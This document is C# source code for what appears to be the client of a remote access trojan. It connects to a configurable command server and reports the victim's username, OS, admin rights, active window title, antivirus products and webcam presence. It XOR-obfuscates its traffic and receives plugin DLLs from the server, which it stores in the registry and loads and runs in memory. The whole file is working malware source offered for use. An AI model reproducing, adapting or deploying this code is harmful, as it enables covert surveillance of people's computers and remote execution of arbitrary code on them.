﻿using MessagePack;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices.ComTypes;
using EXCEPINFO = System.Runtime.InteropServices.ComTypes.EXCEPINFO;
using DISPPARAMS = System.Runtime.InteropServices.ComTypes.DISPPARAMS;
using System.Net;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
using Timer = System.Threading.Timer;
using Microsoft.Win32;

namespace Client
{
    class Program
    {
        #region Setting
        public static readonly string Link = null;
        public static readonly string Host = "127.0.0.1";        
        public static readonly int Port = 8848;
        public static readonly string Version = "0.0.1";
        public static readonly string Mutex = "qwqdanchun";
        public static readonly string Group = "Default";
        public static readonly string XorKey = "qwqdanchun";

        public static string HWID = "";
        #endregion

        static void Main(string[] args)
        {
            HWID = GetHWID();
            CreateMutex();
            InitializeClient();
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        #region Socket

        public static Socket TcpClient { get; set; } //Main socket
        private static byte[] Buffer { get; set; } //Socket buffer
        private static long HeaderSize { get; set; } //Recevied size
        private static long Offset { get; set; } // Buffer location
        private static Timer KeepAlive { get; set; } //Send Performance
        public static bool IsConnected { get; set; } //Check socket status
        private static object SendSync { get; } = new object(); //Sync send
        private static Timer Ping { get; set; } //Send ping interval
        public static int Interval { get; set; } //ping value
        public static bool ActivatePong { get; set; }

        public static List<MsgPack> Packs = new List<MsgPack>();

        public static void InitializeClient() //Connect & reconnect
        {
            try
            {

                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                if (Link == null)
                {
                    if (IsValidDomainName(Host))
                    {
                        IPAddress[] addresslist = Dns.GetHostAddresses(Host);

                        foreach (IPAddress theaddress in addresslist)
                        {
                            try
                            {
                                TcpClient.Connect(theaddress, Port);
                                if (TcpClient.Connected) break;
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        TcpClient.Connect(Host, Port);
                    }
                }
                else
                {
                    using (WebClient wc = new WebClient())
                    {
                        NetworkCredential networkCredential = new NetworkCredential("", "");
                        wc.Credentials = networkCredential;
                        string resp = wc.DownloadString(Link);
                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                        TcpClient.Connect(spl[0], Convert.ToInt32(spl[new Random().Next(1, spl.Length)]));
                    }
                }

                if (TcpClient.Connected)
                {
                    IsConnected = true;
                    HeaderSize = 4;
                    Buffer = new byte[HeaderSize];
                    Offset = 0;
                    Send(SendInfo());
                    Interval = 0;
                    ActivatePong = false;
                    KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                    Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    Reconnect();
                    return;
                }
            }
            catch
            {
                Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
                Reconnect();
                return;
            }
        }

        private static bool IsValidDomainName(string name)
        {
            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
        }

        public static void Reconnect()
        {
            if (TcpClient.Connected) return;


            try
            {
                Ping?.Dispose();
                KeepAlive?.Dispose();
                if (TcpClient != null)
                {
                    TcpClient.Close();
                    TcpClient.Dispose();
                }
            }
            catch { }
            InitializeClient();
            IsConnected = false;
        }

        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    Reconnect();
                    return;
                }
                int recevied = TcpClient.EndReceive(ar);
                if (recevied > 0)
                {
                    Offset += recevied;
                    HeaderSize -= recevied;
                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        //Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];
                            while (HeaderSize > 0)
                            {
                                int rc = TcpClient.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
                                if (rc <= 0)
                                {
                                    Reconnect();
                                    return;
                                }
                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    Reconnect();
                                    return;
                                }
                            }
                            Thread thread = new Thread(new ParameterizedThreadStart(Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        Reconnect();
                        return;
                    }
                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                }
                else
                {
                    Reconnect();
                    return;
                }
            }
            catch
            {
                Reconnect();
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected)
                    {
                        return;
                    }

                    byte[] buffer = Xor((byte[])msg);
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    TcpClient.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
                    TcpClient.Send(buffer, 0, buffer.Length, SocketFlags.None);
                }
                catch
                {
                    Reconnect();
                    return;
                }
            }
        }

        public static void KeepAlivePacket(object obj)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = GetActiveWindowTitle();
                Send(msgpack.Encode2Bytes());
                GC.Collect();
                ActivatePong = true;
            }
            catch { }
        }

        private static void Pong(object obj)
        {
            try
            {
                if (ActivatePong && IsConnected)
                {
                    Interval++;
                }
            }
            catch { }
        }


        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(Xor((byte[])data));
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "Pong": //send interval value to server
                        {
                            ActivatePong = false;
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Packet").SetAsString("Pong");
                            msgPack.ForcePathObject("Message").SetAsInteger(Interval);
                            Send(msgPack.Encode2Bytes());
                            Interval = 0;
                            break;
                        }

                    case "plugin": // run plugin in memory
                        {
                            try
                            {
                                if (GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null) // check if plugin is installed
                                {
                                    Packs.Add(unpack_msgpack); //save it for later
                                    MsgPack msgPack = new MsgPack();
                                    msgPack.ForcePathObject("Packet").SetAsString("sendPlugin");
                                    msgPack.ForcePathObject("Hashes").SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
                                    Send(msgPack.Encode2Bytes());
                                }
                                else
                                    Invoke(unpack_msgpack);
                            }
                            catch (Exception ex)
                            {
                                Error(ex.Message);
                            }
                            break;
                        }

                    case "savePlugin": // save plugin
                        {
                            SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
                            Debug.WriteLine("plugin saved");
                            foreach (MsgPack msgPack in Packs.ToList())
                            {
                                if (msgPack.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
                                {
                                    Invoke(msgPack);
                                    Packs.Remove(msgPack);
                                }
                            }
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Invoke(MsgPack unpack_msgpack)
        {
            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)));
            Type type = assembly.GetType("Plugin.Plugin");
            dynamic instance = Activator.CreateInstance(type);
            instance.Run(TcpClient, HWID, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), currentApp);
            Received();
        }

        private static void Received() //reset client forecolor
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Received";
            Send(msgpack.Encode2Bytes());
            Thread.Sleep(1000);
        }

        public static void Error(string ex) //send to logs
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Send(msgpack.Encode2Bytes());
        }

        #endregion

        #region

        public static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = HWID;
            msgpack.ForcePathObject("User").AsString = Environment.UserName;
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.Replace("Microsoft", null) + " " + (Environment.Is64BitOperatingSystem? "64bit":"32bit");
            msgpack.ForcePathObject("Camera").SetAsBoolean(havecamera());
            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
            msgpack.ForcePathObject("Version").AsString = Version;
            msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
            msgpack.ForcePathObject("Active").AsString = GetActiveWindowTitle();
            msgpack.ForcePathObject("AV").AsString = GetAV();
            msgpack.ForcePathObject("Install-Type").AsInteger = 0;//GetInstallType();
            msgpack.ForcePathObject("Install-Time").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
            msgpack.ForcePathObject("Group").AsString = Group;
            return msgpack.Encode2Bytes();
        }

        #region Info

        #region Active
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        public static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                StringBuilder buff = new StringBuilder(nChars);
                IntPtr handle = GetForegroundWindow();
                if (GetWindowText(handle, buff, nChars) > 0)
                {
                    return buff.ToString();
                }
            }
            catch { }
            return "";
        }
        #endregion

        #region HWID
        public static string GetHWID()
        {
            try
            {
                string strToHash = string.Concat(Environment.ProcessorCount, Environment.UserName,
                    Environment.MachineName, Environment.OSVersion
                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
                MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
                byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
                bytesToHash = md5Obj.ComputeHash(bytesToHash);
                StringBuilder strResult = new StringBuilder();
                foreach (byte b in bytesToHash)
                    strResult.Append(b.ToString("x2"));
                return strResult.ToString().Substring(0, 20).ToUpper();
            }
            catch
            {
                return "Err HWID";
            }
        }
        #endregion

        #region AV
        public static string GetAV()
        {
            string AV = "";
            IWSCProductList pWSCProductList;
            Type WSCProductListType = Type.GetTypeFromCLSID(new Guid("17072F7B-9ABE-4A74-A261-1EB76B55107A"), true);
            object WSCProductList = Activator.CreateInstance(WSCProductListType);
            pWSCProductList = (IWSCProductList)WSCProductList;

            if (0 == pWSCProductList.Initialize((uint)0x4))
            {
                uint nProductCount = 0;
                if (0 == pWSCProductList.get_Count(out nProductCount))
                {
                    for (uint i = 0; i < nProductCount; i++)
                    {
                        IWscProduct pWscProduct;
                        if (0 == pWSCProductList.get_Item(i, out pWscProduct))
                        {
                            string sProductName = new string('\0', 260);

                            if (0 == pWscProduct.get_ProductName(out sProductName))
                            {
                                if (AV != "")
                                {
                                    AV += " ; ";
                                }
                                AV += sProductName;
                            }
                            Marshal.ReleaseComObject(pWscProduct);
                        }
                    }
                }
                Marshal.ReleaseComObject(pWSCProductList);
            }
            return AV;
        }


        [ComImport]
        [Guid("8C38232E-3A45-4A27-92B0-1A16A975F669")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IWscProduct
        {
            #region <IDispatch>
            int GetTypeInfoCount();
            [return: MarshalAs(UnmanagedType.Interface)]
            IntPtr GetTypeInfo([In, MarshalAs(UnmanagedType.U4)] int iTInfo, [In, MarshalAs(UnmanagedType.U4)] int lcid);
            [PreserveSig]
            int GetIDsOfNames([In] ref Guid riid, [In, MarshalAs(UnmanagedType.LPArray)] string[] rgszNames, [In, MarshalAs(UnmanagedType.U4)] int cNames,
                [In, MarshalAs(UnmanagedType.U4)] int lcid, [Out, MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);
            [PreserveSig]
            int Invoke(int dispIdMember, [In] ref Guid riid, [In, MarshalAs(UnmanagedType.U4)] int lcid, [In, MarshalAs(UnmanagedType.U4)] int dwFlags,
                [Out, In] DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
            #endregion

            int get_ProductName(out string pVal);
        }

        [ComImport]
        [Guid("722A338C-6E8E-4E72-AC27-1417FB0C81C2")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IWSCProductList
        {
            #region <IDispatch>
            int GetTypeInfoCount();
            [return: MarshalAs(UnmanagedType.Interface)]
            IntPtr GetTypeInfo([In, MarshalAs(UnmanagedType.U4)] int iTInfo, [In, MarshalAs(UnmanagedType.U4)] int lcid);
            [PreserveSig]
            int GetIDsOfNames([In] ref Guid riid, [In, MarshalAs(UnmanagedType.LPArray)] string[] rgszNames, [In, MarshalAs(UnmanagedType.U4)] int cNames,
                [In, MarshalAs(UnmanagedType.U4)] int lcid, [Out, MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);
            [PreserveSig]
            int Invoke(int dispIdMember, [In] ref Guid riid, [In, MarshalAs(UnmanagedType.U4)] int lcid, [In, MarshalAs(UnmanagedType.U4)] int dwFlags,
                [Out, In] DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
            #endregion

            int Initialize(uint provider);
            int get_Count(out uint pVal);
            int get_Item(uint index, out IWscProduct pVal);
        }
        #endregion

        #region Camera
        public static bool havecamera()
        {
            string[] devices = FindDevices();
            if (devices.Length == 0)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        public static readonly Guid CLSID_VideoInputDeviceCategory = new Guid("{860BB310-5D01-11d0-BD3B-00A0C911CE86}");
        public static readonly Guid CLSID_SystemDeviceEnum = new Guid("{62BE5D10-60EB-11d0-BD3B-00A0C911CE86}");
        public static readonly Guid IID_IPropertyBag = new Guid("{55272A00-42CB-11CE-8135-00AA004BB851}");
        public static string[] FindDevices()
        {
            return GetFiltes(CLSID_VideoInputDeviceCategory).ToArray();
        }

        public static List<string> GetFiltes(Guid category)
        {
            var result = new List<string>();
            EnumMonikers(category, (moniker, prop) =>
            {
                object value = null;
                prop.Read("FriendlyName", ref value, 0);
                var name = (string)value;
                result.Add(name);
                return false;
            });

            return result;
        }


        private static void EnumMonikers(Guid category, Func<IMoniker, IPropertyBag, bool> func)
        {
            IEnumMoniker enumerator = null;
            ICreateDevEnum device = null;

            try
            {
                device = (ICreateDevEnum)Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_SystemDeviceEnum));
                device.CreateClassEnumerator(ref category, ref enumerator, 0);
                if (enumerator == null) return;
                var monikers = new IMoniker[1];
                var fetched = IntPtr.Zero;

                while (enumerator.Next(monikers.Length, monikers, fetched) == 0)
                {
                    var moniker = monikers[0];
                    object value = null;
                    Guid guid = IID_IPropertyBag;
                    moniker.BindToStorage(null, null, ref guid, out value);
                    var prop = (IPropertyBag)value;
                    try
                    {
                        var rc = func(moniker, prop);
                        if (rc == true) break;
                    }
                    finally
                    {
                        Marshal.ReleaseComObject(prop);
                        if (moniker != null) Marshal.ReleaseComObject(moniker);
                    }
                }
            }
            finally
            {
                if (enumerator != null) Marshal.ReleaseComObject(enumerator);
                if (device != null) Marshal.ReleaseComObject(device);
            }
        }
        [ComVisible(true), ComImport(), Guid("29840822-5B84-11D0-BD3B-00A0C911CE86"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface ICreateDevEnum
        {
            int CreateClassEnumerator([In] ref Guid pType, [In, Out] ref IEnumMoniker ppEnumMoniker, [In] int dwFlags);
        }

        [ComVisible(true), ComImport(), Guid("55272A00-42CB-11CE-8135-00AA004BB851"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IPropertyBag
        {
            int Read([MarshalAs(UnmanagedType.LPWStr)] string PropName, ref object Var, int ErrorLog);
            int Write(string PropName, ref object Var);
        }
        #endregion

        #endregion


        static byte[] Xor(byte[] buffer)
        {
            char[] key = XorKey.ToCharArray();
            byte[] newByte = new byte[buffer.Length];

            int j = 0;

            for (int i = 0; i < buffer.Length; i++)
            {
                if (j == key.Length)
                {
                    j = 0;
                }
                newByte[i] = (byte)(buffer[i] ^ Convert.ToByte(key[j]));
                j++;
            }
            return newByte;
        }

        

        #endregion

        #region Mutex
        public static Mutex currentApp;
        public static bool CreateMutex()
        {
            bool createdNew;
            currentApp = new Mutex(false, Mutex, out createdNew);
            return createdNew;
        }
        public static void CloseMutex()
        {
            if (currentApp != null)
            {
                currentApp.Close();
                currentApp = null;
            }
        }
        #endregion

        #region Helper
        public static byte[] GetValue(string value)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\" + HWID))
                {
                    object o = key.GetValue(value);
                    return (byte[])o;
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
            return null;
        }

        public static bool SetValue(string name, byte[] value)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\" + HWID, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    key.SetValue(name, value, RegistryValueKind.Binary);
                    return true;
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
            return false;
        }
        #endregion
    }
}
